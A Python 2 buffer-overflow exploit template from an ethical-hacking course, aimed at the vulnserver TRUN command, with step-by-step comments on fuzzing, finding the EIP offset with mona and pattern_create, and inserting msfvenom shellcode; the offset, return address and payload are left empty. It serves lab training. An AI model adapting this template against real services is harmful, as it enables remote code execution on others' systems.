#!/usr/bin/python2
#Inspiration for this came from TCM Academy's Practical Ethical Hacking course in the Buffer Overflow section
#This script is meant to be highly modified throughout the process of a BoF

# Usage would be similar to the following
# Step 1- Suspect a program is vulnerable to BoF
# Step 2- Modify RHOST, RPORT, and VULN variables in this script
# Step 3- Start program to be debugged (open in immunity and run it)
# Step 4- Use spiking and fuzzing to determine what part of the program is vulnerable (add it to the VULN variable's value)
# Step 5- Determine at what point the program crashes when fuzzing or spiking (number of bytes sent)
# Step 6- Add 400 bytes to that number (for example, if the program crashes at 1000 bytes, you'd have 1400)
# Step 7- Use /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [value from previous step]
# Setp 9- Copy output from this command to PAYLOAD variable in this script and restart program/debugger
# Step 10- Get mona.py (for immunity debugger) from here: https://github.com/corelan/mona/blob/master/mona.py
# Step 11- In immunity, type: !mona findmsp -distance [value from step 6]
# Step 12- Note the offset listed in Immunity (EIP contains normal pattern : ... (offset XXXX))
# Step 13- Update the OFFSET value in this script (originally was 0) to match the offset found in step 12
# Step 14- Set the value of the RTN variable in this script to 'BBBB'
# Step 15- Restart debugger/program and rerun this script


import sys, socket

# Target IP (machine running program being targeted)
RHOST = '192.168.50.13'
# Target port (port on machine where you can connect to the target program)
RPORT = 9999
 
# Vulnerable command of program (found by spiking/fuzzing program). TRUN is for vulnserver; replace with target command
VULN = 'TRUN /.:/'
# Discovered offset (final number from simplefuzzer tool output)
OFFSET = 0
# Character to use for buffer
BUFF = 'A' * OFFSET
# Discovered return address (in reverse- if it was 00 01 02[\x00\x01\x02] JMP would be \x02\x01\x00
RTN = ''   
# Adding padding (NOP)- sometimes it needs to be smaller (*16 or *8)
PADDING = ''
# For adding various payloads in the process including shellcode for exploitation (payload from msfvenom)
PAYLOAD = (
)  
 
#Line of coding combining all above variables into a variable called TEST for ease of use 
TEST = VULN + BUFF + RTN + PADDING + PAYLOAD
#Line of code setting up socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
        #connect to target at specified port
        s.connect((RHOST, RPORT))
        #send the payload TEST to the target program
        s.send((TEST))
        #close the connection
        s.close()
       
except:
        print "Error connecting to server"
        sys.exit()
